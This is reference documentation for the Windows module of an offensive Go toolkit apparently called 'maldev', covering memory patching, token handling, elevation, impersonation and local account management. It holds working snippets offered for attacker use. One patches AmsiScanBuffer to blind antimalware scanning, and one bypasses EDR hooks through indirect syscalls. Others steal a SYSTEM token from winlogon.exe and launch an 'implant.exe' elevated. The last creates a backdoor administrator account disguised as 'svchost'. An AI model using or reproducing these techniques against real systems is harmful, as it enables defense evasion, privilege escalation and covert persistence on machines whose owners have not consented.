---
last_reviewed: 2026-04-27
reflects_commit: a705c32
---

# Windows Internals (win/)

[<- Back to README](../README.md)

The `win/` module provides the Windows-specific foundation for the entire maldev workspace: centralized DLL handles, memory patching, token manipulation, privilege management, version detection, impersonation, and domain queries.

## Packages

| Package | Description | Platform |
|---------|-------------|----------|
| `win/api` | Centralized DLL handles, LazyProc declarations, memory patching, shared structs | Windows |
| `win/token` | Token open, duplicate, privilege manipulation, integrity level query | Windows |
| `win/privilege` | Admin detection, RunAs execution, UAC elevation | Windows |
| `win/ntapi` | Typed wrappers for NT functions (NtAllocateVirtualMemory, etc.) | Windows |
| `win/version` | OS version detection via RtlGetVersion + registry UBR | Windows |
| `win/impersonate` | Thread impersonation with LogonUserW | Windows |
| `win/domain` | Domain membership query | Windows |
| `persistence/account` | Local user account management via NetAPI32 | Windows |
| `win/syscall` | Syscall methods (WinAPI/NativeAPI/Direct/Indirect) -- see [syscalls.md](syscalls.md) | Windows |

---

## win/api -- Centralized DLL Handles and Memory Patching

### How win/api Centralizes DLL Handles

Every module in maldev that needs a Windows API must import `win/api` rather than creating its own `windows.NewLazySystemDLL`. This ensures:

1. **No duplicate handles:** Go's `LazySystemDLL` loads the DLL on first use. If multiple packages each declare their own `Kernel32`, the DLL gets loaded multiple times. Centralizing in `win/api` means one handle per DLL across the entire binary.
2. **Consistent search path restriction:** `NewLazySystemDLL` only loads from `System32`, preventing DLL hijacking via the current directory or `PATH`.
3. **Single source of truth:** When a proc is needed, check `win/api` first. If it has a typed wrapper in `golang.org/x/sys/windows` (e.g., `windows.VirtualAlloc`), prefer that over `ProcVirtualAllocEx.Call()`.

**Declared DLLs:**

| Variable | DLL | Typical functions |
|----------|-----|-------------------|
| `Kernel32` | kernel32.dll | VirtualAlloc, CreateThread, process/thread management |
| `Ntdll` | ntdll.dll | NtAllocateVirtualMemory, NtProtectVirtualMemory, ETW functions |
| `Advapi32` | advapi32.dll | LogonUserW, token functions, security descriptors |
| `User32` | user32.dll | MessageBoxW |
| `Shell32` | shell32.dll | ShellExecuteW, SHGetSpecialFolderPathW |
| `Userenv` | userenv.dll | CreateEnvironmentBlock |
| `Netapi32` | netapi32.dll | Network management APIs |
| `Amsi` | amsi.dll | AmsiScanBuffer, AmsiOpenSession |

### PatchMemory

```go
func PatchMemory(addr uintptr, patch []byte) error
```

**Purpose:** Overwrites bytes at a memory address, temporarily changing the page protection to `PAGE_EXECUTE_READWRITE`.

**Parameters:**
- `addr` (uintptr) -- Target address in the current process.
- `patch` ([]byte) -- Bytes to write.

**How it works:**
1. Calls `VirtualProtect(addr, size, PAGE_EXECUTE_READWRITE, &oldProtect)` to make the page writable.
2. Writes each byte of `patch` to the target address via unsafe pointer arithmetic.
3. Restores the original protection with `VirtualProtect(addr, size, oldProtect, &dummy)`.

This is the canonical patching function used by all evasion modules (AMSI, ETW, etc.) to overwrite function prologues with `ret` instructions.

```go
import "github.com/oioio-space/maldev/win/api"

// Patch AmsiScanBuffer to return immediately
addr := api.ProcAmsiScanBuffer.Addr()
api.PatchMemory(addr, []byte{0xC3}) // ret
```

### PatchMemoryWithCaller

```go
func PatchMemoryWithCaller(addr uintptr, patch []byte, caller *wsyscall.Caller) error
```

**Purpose:** Same as `PatchMemory`, but routes the `VirtualProtect` calls through the provided syscall Caller.

**Parameters:**
- `addr` (uintptr) -- Target address.
- `patch` ([]byte) -- Bytes to write.
- `caller` (*wsyscall.Caller) -- Syscall routing. When `nil`, falls back to standard `PatchMemory`.

**How it works:** Uses `NtProtectVirtualMemory` via `caller.Call()` instead of `windows.VirtualProtect`. The current process handle is specified as `^uintptr(0)` (pseudo-handle -1). This allows the memory protection change itself to bypass EDR hooks on `VirtualProtect`.

```go
import (
    "github.com/oioio-space/maldev/win/api"
    wsyscall "github.com/oioio-space/maldev/win/syscall"
)

caller := wsyscall.New(wsyscall.MethodIndirect, wsyscall.NewHalosGate())
err := api.PatchMemoryWithCaller(addr, []byte{0xC3}, caller)
```

### PatchProc / PatchProcWithCaller

```go
func PatchProc(proc *windows.LazyProc, patch []byte) error
func PatchProcWithCaller(proc *windows.LazyProc, patch []byte, caller *wsyscall.Caller) error
```

**Purpose:** Convenience wrappers that resolve a `LazyProc`'s address and patch it. Returns `ErrProcNotFound` if the proc cannot be resolved (e.g., the DLL is not loaded or the export does not exist).

```go
err := api.PatchProc(api.ProcAmsiScanBuffer, []byte{0xC3})
if errors.Is(err, api.ErrProcNotFound) {
    // amsi.dll not loaded, nothing to patch
}
```

### Shared Structs

`win/api` also declares shared structures used across multiple packages:

- **MEMORYSTATUSEX** -- For `GlobalMemoryStatusEx` (sandbox detection via RAM check).
- **ListEntry** -- Windows `LIST_ENTRY` (doubly-linked list node).
- **SystemHandle / SystemHandleInformationEx** -- For `NtQuerySystemInformation` class 64 (handle enumeration).
- **Context64** -- x64 thread context (`CONTEXT` structure) for thread hijacking injection.

### Error Types

- **ErrProcNotFound** -- Returned when a LazyProc cannot be resolved. Use `errors.Is` to handle gracefully.
- **ErrNotSupported** -- Returned when a feature requires a newer Windows version.
- **NTSTATUSError** -- Wraps an NTSTATUS code as a Go error. `IsNTSuccess(status)` checks for success (0x00000000).

---

## win/token -- Token Manipulation

### OpenProcessToken

```go
func OpenProcessToken(pid int, typ Type) (*Token, error)
```

**Purpose:** Opens and duplicates the token for a process.

**Parameters:**
- `pid` (int) -- Process ID. Pass `0` for the current process.
- `typ` (Type) -- Token type to create:
  - `Primary` -- For `CreateProcessAsUser` (running processes under a different token).
  - `Impersonation` -- For thread impersonation.
  - `Linked` -- The elevated half of a split token (UAC).

**How it works:**
1. Opens the process handle (`OpenProcess` or `CurrentProcess`).
2. Opens the process token with `TOKEN_ALL_ACCESS`.
3. Duplicates the token with `DuplicateTokenEx` using the requested security level (`SecurityDelegation` for Primary/Linked, `SecurityImpersonation` for Impersonation).
4. For `Linked` type, additionally calls `GetLinkedToken` to retrieve the elevated token.

```go
import "github.com/oioio-space/maldev/win/token"

// Get current process token as Primary
tok, err := token.OpenProcessToken(0, token.Primary)
defer tok.Close()

level, _ := tok.IntegrityLevel() // "Medium", "High", or "System"
```

### Interactive

```go
func Interactive(typ Type) (*Token, error)
```

**Purpose:** Gets the token of the currently logged-in interactive user.

**How it works:** Uses `WTSEnumerateSessions` to find the active session, then `WTSQueryUserToken` to get the session's token, and duplicates it.

**Requires:** SYSTEM-level privileges (typically used from a service).

```go
tok, err := token.Interactive(token.Primary)
```

### Token Methods

| Method | Purpose |
|--------|---------|
| `Token()` | Returns the underlying `windows.Token` |
| `Close()` | Closes the token handle |
| `Privileges()` | Lists all privileges with name, description, enabled/disabled/removed status |
| `EnableAllPrivileges()` | Enables all non-removed, currently disabled privileges |
| `DisableAllPrivileges()` | Disables all currently enabled privileges |
| `RemoveAllPrivileges()` | Permanently removes all privileges from the token |
| `EnablePrivilege(name)` | Enables a single privilege (e.g., `"SeDebugPrivilege"`) |
| `DisablePrivilege(name)` | Disables a single privilege |
| `RemovePrivilege(name)` | Permanently removes a single privilege |
| `EnablePrivileges(names)` | Enables multiple privileges at once |
| `DisablePrivileges(names)` | Disables multiple privileges at once |
| `RemovePrivileges(names)` | Removes multiple privileges at once |
| `IntegrityLevel()` | Returns `"Low"`, `"Medium"`, `"High"`, `"System"`, or `"Unknown"` |
| `LinkedToken()` | Returns the linked (elevated) token if one exists |
| `UserDetails()` | Returns username, domain, account type, profile directory, and environment variables |

```go
tok, _ := token.OpenProcessToken(0, token.Primary)
defer tok.Close()

// Enable SeDebugPrivilege (needed for OpenProcess on protected processes)
tok.EnablePrivilege("SeDebugPrivilege")

// List all privileges
privs, _ := tok.Privileges()
for _, p := range privs {
    fmt.Println(p) // "SeDebugPrivilege: Enabled"
}
```

### Token Theft -- Steal and StealByName

#### `Steal(pid int) (*Token, error)`

**Purpose:** Duplicates the primary token from a target process. This is the standard post-exploitation token theft chain: open the process, query its token, duplicate it as a primary token.

**Parameters:**
- `pid` (int) -- Target process ID.

**Requires:** `SeDebugPrivilege` for SYSTEM-level processes.

**How it works:**
1. `OpenProcess` with `PROCESS_QUERY_INFORMATION`.
2. `OpenProcessToken` with `TOKEN_DUPLICATE | TOKEN_QUERY`.
3. `DuplicateTokenEx` as `SecurityImpersonation` / `TokenPrimary`.

```go
import "github.com/oioio-space/maldev/win/token"

tok, err := token.Steal(targetPID)
if err != nil {
    log.Fatal(err)
}
defer tok.Close()

level, _ := tok.IntegrityLevel() // "System" if stolen from a SYSTEM process
```

#### `StealByName(processName string) (*Token, error)`

**Purpose:** Finds the first process matching the given name and steals its token. Convenience wrapper around `Steal`.

**Parameters:**
- `processName` (string) -- Process name to search for (e.g., `"winlogon.exe"`).

```go
import "github.com/oioio-space/maldev/win/token"

// Steal SYSTEM token from winlogon.exe
tok, err := token.StealByName("winlogon.exe")
if err != nil {
    log.Fatal(err)
}
defer tok.Close()
// Now use tok to create elevated processes or impersonate
```

---

## win/privilege -- Admin Detection and Elevation

### IsAdmin

```go
func IsAdmin() (admin bool, elevated bool, err error)
```

**Purpose:** Checks if the process is running as administrator and whether the token is elevated.

**Returns:**
- `admin` -- True if the token is a member of `BUILTIN\Administrators` (SID `S-1-5-32-544`).
- `elevated` -- True if the token is elevated (UAC has been passed).

**How it works:** Allocates the Administrators SID, opens the current process token, and calls `IsMember` + `IsElevated`.

```go
import "github.com/oioio-space/maldev/win/privilege"

admin, elevated, err := privilege.IsAdmin()
if admin && !elevated {
    // UAC bypass needed
}
```

### IsAdminGroupMember

```go
func IsAdminGroupMember() (bool, error)
```

**Purpose:** Checks group membership via `user.Current().GroupIds()` rather than token inspection. Returns true if the user's groups include `S-1-5-32-544`.

### ExecAs

```go
func ExecAs(ctx context.Context, isInDomain bool, domain, username, password string, path string, args ...string) error
```

**Purpose:** Executes a program under alternate credentials using `LogonUserW` + `exec.Command` with `SysProcAttr.Token`.

**Parameters:**
- `isInDomain` -- If false, uses `LOGON32_LOGON_INTERACTIVE` and sets domain to `"."` (local machine).
- `domain`, `username`, `password` -- Credentials.
- `path` -- Executable path.
- `args` -- Command-line arguments.

**How it works:** Logs on the user, wraps the token, enables all privileges, then starts the process with `HideWindow: true` and the impersonation token.

```go
privilege.ExecAs(ctx, false, "", "admin", "P@ssw0rd", `C:\Windows\System32\cmd.exe`, "/c", "whoami")
```

### CreateProcessWithLogon

```go
func CreateProcessWithLogon(domain, username, password string, wd string, path string, args ...string) error
```

**Purpose:** Executes a program via the Win32 `CreateProcessWithLogonW` API. Unlike `ExecAs`, this does not require the caller to have `SeAssignPrimaryTokenPrivilege`.

### ShellExecuteRunAs

```go
func ShellExecuteRunAs(path, wd string, args ...string) error
```

**Purpose:** Triggers a UAC elevation prompt via `ShellExecuteW` with the `"runas"` verb.

```go
privilege.ShellExecuteRunAs(`C:\Temp\implant.exe`, `C:\Temp`)
```

---

## win/ntapi -- Typed NT Function Wrappers

These are convenience wrappers around `ntdll.dll` exports. They call through `win/api` LazyProc handles (hookable at the ntdll level). For hook bypass, use `win/syscall` instead.

### NtAllocateVirtualMemory

```go
func NtAllocateVirtualMemory(process windows.Handle, baseAddr, size uintptr, allocType, protect uint32) (uintptr, error)
```

Allocates memory in a process. Returns the base address of the allocation.

### NtWriteVirtualMemory

```go
func NtWriteVirtualMemory(process windows.Handle, baseAddr uintptr, buffer []byte) (uintptr, error)
```

Writes data into a process's virtual memory. Returns the number of bytes written.

### NtProtectVirtualMemory

```go
func NtProtectVirtualMemory(process windows.Handle, baseAddr, size uintptr, newProtect uint32) (uint32, error)
```

Changes memory protection. Returns the previous protection value.

### NtCreateThreadEx

```go
func NtCreateThreadEx(process windows.Handle, startAddr, parameter uintptr) (windows.Handle, error)
```

Creates a thread in a process at the given start address. Returns the thread handle.

### NtQuerySystemInformation

```go
func NtQuerySystemInformation(infoClass int32, buf unsafe.Pointer, bufLen uint32) (uint32, error)
```

Queries system information. Returns the required buffer length.

```go
import (
    "github.com/oioio-space/maldev/win/ntapi"
    "golang.org/x/sys/windows"
)

// Allocate RW memory in the current process
addr, err := ntapi.NtAllocateVirtualMemory(
    windows.CurrentProcess(),
    0,
    4096,
    windows.MEM_COMMIT|windows.MEM_RESERVE,
    windows.PAGE_READWRITE,
)
```

---

## win/version -- OS Version Detection

### Current

```go
func Current() *Version
```

**Purpose:** Returns the current Windows version via `RtlGetVersion`.

**Why RtlGetVersion instead of GetVersionEx:** Starting with Windows 8.1, `GetVersionEx` lies -- it reports the version from the application's compatibility manifest rather than the actual OS version. `RtlGetVersion` (an NT function) always returns the true version.

```go
import "github.com/oioio-space/maldev/win/version"

v := version.Current()
fmt.Println(v.String())        // "windows 11"
fmt.Println(v.BuildNumber)     // 22621
fmt.Println(v.IsWorkStation()) // true
```

### Version Methods

| Method | Purpose |
|--------|---------|
| `String()` | Human-readable name ("windows 10", "windows server 2022", etc.) |
| `IsWorkStation()` | True if the machine is a workstation (not a server) |
| `IsLower(v)` | True if this version is older than `v` |
| `IsEqual(v)` | True if major/minor/build match |

### Windows

```go
func Windows() (*WindowsVersion, error)
```

**Purpose:** Returns the full Windows version including the UBR (Update Build Revision) read from the registry.

**How it works:** Calls `RtlGetVersion` for major/minor/build, then reads the `UBR` DWORD from `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion`. The UBR identifies the specific cumulative update and is essential for vulnerability checks.

```go
v, err := version.Windows()
// v.Major=10, v.Minor=0, v.Build=22621, v.Revision=3737
```

### CVE202430088

```go
func CVE202430088() (*WindowsVersion, error)
```

**Purpose:** Checks if the system is vulnerable to CVE-2024-30088 (kernel privilege escalation). Sets `Vulnerable=true` if the build+UBR is below the patched version.

```go
v, _ := version.CVE202430088()
if v.Vulnerable {
    // exploit available
}
```

### Pre-defined Version Constants

The package exports constants for common Windows versions (e.g., `WINDOWS_10_22H2`, `WINDOWS_11_23H2`, `WINDOWS_SERVER_2022_21H2`) for use in comparisons:

```go
if version.Current().IsLower(version.WINDOWS_10_1809) {
    // feature not available before 1809
}
```

---

## win/impersonate -- Thread Impersonation

### LogonUserW

```go
func LogonUserW(username, domain, password string, logonType LogonType, logonProvider LogonProvider) (windows.Token, error)
```

**Purpose:** Authenticates a user and returns a token.

### ImpersonateLoggedOnUser

```go
func ImpersonateLoggedOnUser(t windows.Token) error
```

**Purpose:** Makes the calling thread impersonate the given token.

### ImpersonateThread

```go
func ImpersonateThread(isInDomain bool, domain, username, password string, callbackFunc func() error) error
```

**Purpose:** Runs a callback function under impersonated credentials on a locked OS thread.

**How it works:**
1. Locks the current goroutine to an OS thread (`runtime.LockOSThread`).
2. Logs on the user via `LogonUserW`.
3. Wraps the token as `Impersonation` type and enables all privileges.
4. Calls `ImpersonateLoggedOnUser`.
5. Executes the callback.
6. Calls `RevertToSelf` (deferred).
7. Unlocks the thread.

```go
import "github.com/oioio-space/maldev/win/impersonate"

err := impersonate.ImpersonateThread(false, "", "admin", "P@ssw0rd", func() error {
    // This code runs as "admin"
    user, domain, _ := impersonate.ThreadEffectiveTokenOwner()
    fmt.Printf("Running as %s\\%s\n", domain, user)
    return nil
})
```

### ThreadEffectiveTokenOwner

```go
func ThreadEffectiveTokenOwner() (user string, domain string, err error)
```

**Purpose:** Returns the user and domain of the current thread's effective token.

---

## win/domain -- Domain Membership

### Name

```go
func Name() (string, uint32, error)
```

**Purpose:** Returns the domain name and join status of the local machine.

**Returns:**
- Domain name string.
- Join status (`NetSetupDomainName`, `NetSetupWorkgroupName`, `NetSetupUnjoined`, `NetSetupUnknownStatus`).

```go
import "github.com/oioio-space/maldev/win/domain"

name, status, err := domain.Name()
// name="CORP", status=3 (NetSetupDomainName)
```

---

## persistence/account -- Local User Account Management

Package `user` provides local Windows user account management via the NetAPI32 functions (`NetUserAdd`, `NetUserDel`, `NetUserSetInfo`, `NetLocalGroupAddMembers`, etc.). Useful for creating backdoor accounts, privilege escalation via group membership, and user enumeration.

**MITRE ATT&CK:** T1136.001 (Create Account: Local Account)
**Platform:** Windows
**Detection:** High -- user creation generates Security event log entries (Event ID 4720).

### Types

#### `Info`

```go
type Info struct {
    Name     string
    FullName string
    Comment  string
    Flags    uint32
}
```

Represents a local Windows user account.

### Errors

```go
var (
    ErrUserExists    = errors.New("user already exists")
    ErrUserNotFound  = errors.New("user not found")
    ErrAccessDenied  = errors.New("access denied")
    ErrGroupNotFound = errors.New("group not found")
)
```

### Functions

#### `Add`

```go
func Add(name, password string) error
```

**Purpose:** Creates a new local user account with the given name and password. The account is created with `UF_SCRIPT | UF_DONT_EXPIRE_PASSWD` flags and `USER_PRIV_USER` privilege level.

**Parameters:**
- `name` -- Username for the new account.
- `password` -- Password for the new account.

**Returns:** `ErrUserExists` if the account already exists, `ErrAccessDenied` if not running as administrator.

---

#### `Delete`

```go
func Delete(name string) error
```

**Purpose:** Removes a local user account.

---

#### `SetPassword`

```go
func SetPassword(name, password string) error
```

**Purpose:** Changes a user's password via `NetUserSetInfo` level 1003.

---

#### `AddToGroup`

```go
func AddToGroup(name, group string) error
```

**Purpose:** Adds a user to a local group. The username is automatically qualified with the local hostname for domain-joined machines.

---

#### `RemoveFromGroup`

```go
func RemoveFromGroup(name, group string) error
```

**Purpose:** Removes a user from a local group.

---

#### `SetAdmin`

```go
func SetAdmin(name string) error
```

**Purpose:** Adds a user to the built-in Administrators group. Uses SID-based lookup (`S-1-5-32-544`) for locale independence -- works on non-English Windows where the group has a localized name.

---

#### `RevokeAdmin`

```go
func RevokeAdmin(name string) error
```

**Purpose:** Removes a user from the built-in Administrators group. Uses the same SID-based lookup as `SetAdmin`.

---

#### `Exists`

```go
func Exists(name string) bool
```

**Purpose:** Checks whether a local user account exists via `NetUserGetInfo` level 0.

---

#### `List`

```go
func List() ([]Info, error)
```

**Purpose:** Returns all local user accounts via `NetUserEnum`. Handles pagination internally (`ERROR_MORE_DATA`).

---

#### `IsAdmin`

```go
func IsAdmin() bool
```

**Purpose:** Checks whether the current process token is a member of the built-in Administrators group via proper SID membership check (handles UAC split tokens correctly).

**Example:**

```go
import "github.com/oioio-space/maldev/persistence/account"

// Create a backdoor account
if err := user.Add("svchost", "P@ssw0rd123!"); err != nil {
    log.Fatal(err)
}
if err := user.SetAdmin("svchost"); err != nil {
    log.Fatal(err)
}

// Enumerate all users
users, _ := user.List()
for _, u := range users {
    fmt.Println(u.Name)
}
```
